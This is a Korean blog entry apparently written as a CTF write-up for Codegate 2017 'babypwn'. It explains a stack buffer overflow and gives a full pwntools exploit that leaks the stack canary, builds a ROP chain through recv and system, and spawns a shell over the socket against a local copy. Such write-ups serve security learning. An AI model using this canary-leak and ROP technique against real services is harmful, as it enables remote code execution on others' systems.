    <entry>
      <title>codegate 2017 CTF - babypwn</title>
      <link href="/2018/09/24/babypwn/"/>
      <url>/2018/09/24/babypwn/</url>
      
        <content type="html"><![CDATA[<p>대충 취약점 발생하는 부분만 대충 살펴보고 system 주소 동적으로 구하려 exploit 작성중 systme@plt 보고서 잠시 현자타임.</p><a id="more"></a><p>buffer의 크기인 40byte보다 더큰 0x64 bytes를 받아들여서 buffer over flow 발생</p><p>나머지는 그냥 rop로 풀면 됨.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line"># OFFSET = 52</span><br><span class="line"> </span><br><span class="line">e = ELF(&quot;./babypwn&quot;)</span><br><span class="line"> </span><br><span class="line">def get_canary():</span><br><span class="line">    s = remote(&quot;127.0.0.1&quot;,8181)</span><br><span class="line">    s.recvuntil(&apos;menu &gt; &apos;)</span><br><span class="line">    s.send(&apos;1\n&apos;)</span><br><span class="line">    s.recvuntil(&apos;: &apos;)</span><br><span class="line">    s.send(&quot;A&quot;*41)</span><br><span class="line">    data = s.recv(54)</span><br><span class="line">    s.close()</span><br><span class="line">    return u32(&apos;\x00&apos; + data[41:44])</span><br><span class="line"> </span><br><span class="line">canary = p32(get_canary())</span><br><span class="line">print &quot;[*] canary : &quot; + str(hex(u32(canary)))</span><br><span class="line">s = remote(&quot;127.0.0.1&quot;,8181)</span><br><span class="line">ppppr = 0x8048eec</span><br><span class="line">pr = 0x8048eef</span><br><span class="line">cmd = &apos;/bin/sh &gt;&amp;4 &lt;&amp;4&apos;</span><br><span class="line">s = process(&quot;./babypwn&quot;)</span><br><span class="line">print s.recvuntil(&apos;menu &gt; &apos;)</span><br><span class="line">s.send(&apos;1\n&apos;)</span><br><span class="line">s.recvuntil(&apos;: &apos;)</span><br><span class="line"> </span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;\x90&quot;*40 + canary + &quot;\x90&quot;*12</span><br><span class="line">payload += p32(e.plt[&apos;recv&apos;]) + p32(ppppr) + p32(4) + p32(e.bss()) + p32(len(cmd)) + p32(0x0)</span><br><span class="line">payload += p32(e.plt[&apos;system&apos;]) + &quot;DUDU&quot; + p32(e.bss())+&quot;\x00\x00\x00\x00&quot;</span><br><span class="line">s.sendline(payload)</span><br><span class="line">print s.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">s.send(&apos;3\n&apos;);sleep(0.3)</span><br><span class="line">s.send(cmd);sleep(0.3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><p>ctf 기분좀 내보려고 flag 파일 내가 만들어서 했다</p>]]></content>
      
      
